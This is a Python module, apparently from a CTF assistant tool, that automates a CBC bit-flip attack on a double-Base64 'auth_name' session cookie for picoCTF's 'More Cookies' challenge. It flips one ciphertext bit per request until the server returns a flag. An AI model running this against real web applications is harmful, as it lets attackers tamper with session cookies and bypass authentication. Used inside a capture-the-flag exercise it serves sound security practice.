"""Bounded CBC bit-flip helper for explicitly authorized CTF cookie challenges."""
from __future__ import annotations
import base64
import urllib.error
import urllib.request
from http.cookiejar import CookieJar
from ..shared.flags import find_flags

def acquire_cookie(url: str, cookie_name: str='auth_name') -> tuple[str|None,str]:
    """Fetch a fresh public CTF session; never reads browser cookies."""
    jar=CookieJar(); opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        request=urllib.request.Request(url,headers={'User-Agent':'CTF-Copilot/0.9 authorized-ctf'})
        with opener.open(request,timeout=10): pass
    except (OSError,urllib.error.HTTPError) as exc:
        return None,f'Could not obtain a fresh cookie: {exc}'
    for item in jar:
        if item.name==cookie_name: return item.value,f'Obtained fresh {cookie_name} cookie from the target.'
    return None,f'Target did not set a {cookie_name} cookie. Log in or supply it manually.'

def _request(url: str, cookie_name: str, value: str) -> str:
    request=urllib.request.Request(url,headers={'User-Agent':'CTF-Copilot/0.9 authorized-ctf','Cookie':f'{cookie_name}={value}'})
    try:
        with urllib.request.urlopen(request,timeout=8) as response:
            return response.read(700_000).decode(response.headers.get_content_charset() or 'utf-8','replace')
    except urllib.error.HTTPError as exc:
        return exc.read(700_000).decode(exc.headers.get_content_charset() or 'utf-8','replace')

def bitflip(url: str, cookie: str, cookie_name: str='auth_name', max_attempts: int=256) -> str:
    """Flip one ciphertext bit per request and stop only on a flag response.

    It expects the double-Base64 encoding used by picoCTF's More Cookies.
    """
    try:
        raw=base64.b64decode(base64.b64decode(cookie),validate=True)
    except Exception as exc:
        return f'Cookie must be Base64(Base64(ciphertext)): {exc}'
    attempts=0
    for byte_index in range(len(raw)):
        for bit in range(8):
            if attempts>=max_attempts:
                return f'No flag after {attempts} single-bit changes. Increase --max-attempts only for this authorized CTF target.'
            modified=bytearray(raw); modified[byte_index]^=1<<bit
            value=base64.b64encode(base64.b64encode(bytes(modified))).decode()
            try: body=_request(url,cookie_name,value)
            except OSError as exc: return f'Request failed after {attempts} attempts: {exc}'
            attempts+=1
            flags=find_flags(body)
            if flags:
                return '\n'.join(['CBC BIT-FLIP RESULT','===================',f'Attempts: {attempts}',f'Changed ciphertext byte {byte_index}, bit {bit}.','Candidate cookie:',value,'Flags:']+[f'  {flag}' for flag in flags])
    return f'No flag after {attempts} single-bit changes. The challenge may use a different cookie format or success page.'
